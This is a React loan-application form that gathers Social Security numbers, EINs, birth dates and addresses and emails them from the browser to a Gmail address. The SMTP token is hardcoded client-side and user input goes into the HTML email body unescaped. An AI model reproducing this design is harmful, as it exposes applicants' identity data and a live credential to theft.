
import React, { useState,} from 'react'
import Swal from 'sweetalert2';



export default function HeroForm() {

    const [merchantFullName, setMerchantFullName] = useState("")
    const [businessLegalName, setBusinessLegalName] = useState("")
    const [amountRequested, setAmountRequested] = useState("")
    const [email, setEmail] = useState("")
    const [businessStartDate, setBusinessStartDate] = useState("")
    const [industry, setIndustry] = useState("")
    const [buisnessAddress, setBuisnessAddress] = useState("")
    const [EIN, setEIN] = useState("")
    const [socialSec, setSocialSec] = useState("")
    const [dateOfBirth, setDateOfBirth] = useState("")
    const [purposeOfFunds, setPurposeOfFunds] = useState("")
    const [homeAddress, setHomeAddress] = useState("")
    const [ownerShip, setOwnerShip] = useState("")
    const [contactNo, setContactNo] = useState("")
    const [altContactNo, setAltContactNo] = useState("")

    const [loader, setLoader] = useState(false)



    // Success Alert
    const showAlert = () => {
        Swal.fire({
            title: 'Thank You!',
            text: 'Your form Has Been Sent Successfully',
            icon: 'success',
            confirmButtonText: 'Okay',
            customClass: {
                // icon:"text-blue-400",
                popup: 'bg-white rounded-lg shadow-lg p-4',
                title: 'text-xl font-bold text-gray-800',
                content: 'text-gray-700',
                confirmButton: 'px-12 py-2 bg-blue-400 text-white font-semibold rounded hover:bg-blue-500 hover:text-outline hover:outline-white '
            }
        });
    };

    // Error Alert
    const showErrorAlert = () => {
        Swal.fire({
            title: 'Error!',
            text: 'Something went wrong.',
            icon: 'error',
            confirmButtonText: 'Try Again',
            customClass: {
                popup: 'bg-white rounded-lg shadow-lg p-4',
                title: 'text-xl font-bold text-red-600',
                content: 'text-gray-700',
                confirmButton: 'px-12 py-2 bg-red-500 text-white rounded hover:bg-red-600'
            }
        });
    };

    // Empty Fields 
    function emptyFields() {

        setMerchantFullName("");
        setBusinessLegalName("");
        setAmountRequested("");
        setEmail("");
        setBusinessStartDate("");
        setIndustry("");
        setBuisnessAddress("");
        setEIN("");
        setSocialSec("");
        setDateOfBirth("");
        setPurposeOfFunds("");
        setHomeAddress("");
        setOwnerShip("");
        setContactNo("");
        setAltContactNo("");
        setLoader(false)

    }

    // FUNCTION to send mail 
    const sendEmail = (e) => {

        e.preventDefault()
        setLoader(true)
        
        const body = `
    <h3>Merchant Details</h3>
    <p><strong>Merchant Full Name:</strong> ${merchantFullName}</p>
    <p><strong>Business Legal Name:</strong> ${businessLegalName}</p>
    <p><strong>Amount Requested:</strong> ${amountRequested}</p>
    <p><strong>Email:</strong> ${email}</p>
    <p><strong>Business Start Date:</strong> ${businessStartDate}</p>
    <p><strong>Industry:</strong> ${industry}</p>
    <p><strong>Business Address:</strong> ${buisnessAddress}</p>
    <p><strong>EIN:</strong> ${EIN}</p>
    <p><strong>Social Security:</strong> ${socialSec}</p>
    <p><strong>Date of Birth:</strong> ${dateOfBirth}</p>
    <p><strong>Purpose of Funds:</strong> ${purposeOfFunds}</p>
    <p><strong>Home Address:</strong> ${homeAddress}</p>
    <p><strong>Ownership:</strong> ${ownerShip}</p>
    <p><strong>Contact No:</strong> ${contactNo}</p>
    <p><strong>Alternate Contact No:</strong> ${altContactNo}</p>
`;


        // CONFIG for smtp-JS  with secure Token
        const config = {
            SecureToken: "b4f2ab17-40a5-4e52-8658-e2ee8e629dcb",
            To: 'outows50@gmail.com',
            From: "outows50@gmail.com",
            Subject: "Cloud Funding Solution",
            Body: body,
            isHtml: true
        }

        // Sending Mail
        if (window.Email) {
            window.Email.send(config)
                .then((res) => {
                    // console.log("submitted Successfully!", res)
                    emptyFields();
                    showAlert();

                })
                .catch((err) => {
                    console.error('Error sending email:', err);
                    showErrorAlert();
                    setLoader(false);
                })
        }
    };



    return (
        <div className=''>
            <main
                className="flex flex-col items-center justify-start px-8 py-8 sm:px-12 lg:col-span-7 lg:px-16 lg:py-2 xl:col-span-6"
            >
                <div className='max-w-[620px] ms-2 text-lg font-serif text-gray-700 '>Please fill out and submit the form below. Our representative will inform you about other requirements for
                    obtaining an loan policy</div>

                <div className="w-full p-1 ">
                    <form onSubmit={sendEmail} className=" mt-2 grid grid-cols-10 gap-5 p-1 ">

                        <div className="col-span-10 sm:col-span-5">
                            <label
                                htmlFor="merchantFullName"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Merchant FullName :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={merchantFullName}
                                onChange={(e) => setMerchantFullName(e.target.value)}
                                type="text"
                                id="merchantFullName"
                                name="merchantFullName"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>


                        <div className="col-span-10 sm:col-span-5">
                            <label
                                htmlFor="businessLegalName"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Business Legal Name :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={businessLegalName}
                                onChange={(e) => setBusinessLegalName(e.target.value)}
                                type="text"
                                id="businessLegalName"
                                name="businessLegalName"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>



                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="amountRequested"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Amount Requested :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={amountRequested}
                                onChange={(e) => setAmountRequested(e.target.value)}
                                type="number"
                                min="1"
                                step="1"
                                id="amountRequested"
                                name="amountRequested"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>


                        <div className="col-span-10 sm:col-span-4">
                            <label
                                htmlFor="email"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Email :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                type="email"
                                id="email"
                                name="email"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>



                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="industry"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Industry :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={industry}
                                onChange={(e) => setIndustry(e.target.value)}
                                type="text"
                                id="industry"
                                name="industry"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>


                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="businessStartDate"
                                className="block text-md font-medium text-gray-700 "
                            > Business Start Date :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={businessStartDate}
                                onChange={(e) => setBusinessStartDate(e.target.value)}
                                type="date"
                                id="businessStartDate"
                                name="businessStartDate"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm  p-1"
                                required
                            />
                        </div>


                        <div className="col-span-10 sm:col-span-7">
                            <label
                                htmlFor="businessAddress"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Business Address :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={buisnessAddress}
                                onChange={(e) => setBuisnessAddress(e.target.value)}
                                type="text"
                                id="businessAddress"
                                name="businessAddress"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required /></div>


                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="EIN"
                                className="block text-md font-medium text-gray-700 "
                            >
                                EIN :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={EIN}
                                onChange={(e) => setEIN(e.target.value)}
                                type="text"
                                id="EIN"
                                name="EIN"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-4">
                            <label
                                htmlFor="socialSec"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Social Sec# :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={socialSec}
                                onChange={(e) => setSocialSec(e.target.value)}
                                type="text"
                                id="socialSec"
                                name="socialSec"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="dateOfBirth"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Date of Birth :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={dateOfBirth}
                                onChange={(e) => setDateOfBirth(e.target.value)}
                                type="date"
                                id="dateOfBirth"
                                name="dateOfBirth"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-5">
                            <label
                                htmlFor="purposeOfFunds"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Purpose of Funds :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={purposeOfFunds}
                                onChange={(e) => setPurposeOfFunds(e.target.value)}
                                type="text"
                                id="purposeOfFunds"
                                name="purposeOfFunds"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-5">
                            <label
                                htmlFor="homeAddress"
                                className="block text-md font-medium text-gray-700 "
                            >Home Address :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={homeAddress}
                                onChange={(e) => setHomeAddress(e.target.value)}
                                type="text"
                                id="homeAddress"
                                name="homeAddress"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="ownerShip"
                                className="block text-md font-medium text-gray-700 "
                            >Ownership % :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={ownerShip}
                                onChange={(e) => setOwnerShip(e.target.value)}
                                type="text"
                                id="ownerShip"
                                name="ownerShip"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-4">
                            <label
                                htmlFor="contactNo"
                                className="block text-md font-medium text-gray-700 "
                            >
                                Contact No :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={contactNo}
                                onChange={(e) => setContactNo(e.target.value)}
                                type="text"
                                id="contactNo"
                                name="contactNo"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>

                        <div className="col-span-10 sm:col-span-3">
                            <label
                                htmlFor="altContactNo"
                                className="block text-md font-medium text-gray-700 "
                            >Alt Contact No :<span className='text-red-600 mt-2 text-xl'>*</span>
                            </label>

                            <input
                                value={altContactNo}
                                onChange={(e) => setAltContactNo(e.target.value)}
                                type="text"
                                id="altContactNo"
                                name="altContactNo"
                                className="mt-1 w-full rounded-md border border-blue-400 bg-white text-sm text-gray-700 shadow-sm p-1"
                                required
                            />
                        </div>




                        <div className="col-span-10 sm:flex sm:items-center justify-end gap-1 sm:gap-4 ">


                            <button
                                className={`bg-blue-400 text-[#FFFFFF] ${!loader && ("hover:bg-white hover:text-blue-400 hover:outline hover:rounded-sm")} inline-block shrink-0 rounded-md border  px-8 py-1 text-lg font-semibold   transition  mt-5 md:mt-0 focus:outline-none focus:ring active:text-blue-500`}
                            >
                                {loader ?
                                    <div className="loader border-t-4 border-b-4 border-white rounded-full w-7 h-8 animate-spin"></div>
                                    :
                                    <>Submit</>}

                            </button>
                        </div>

                    </form>
                </div>
            </main>
        </div>
    )
}
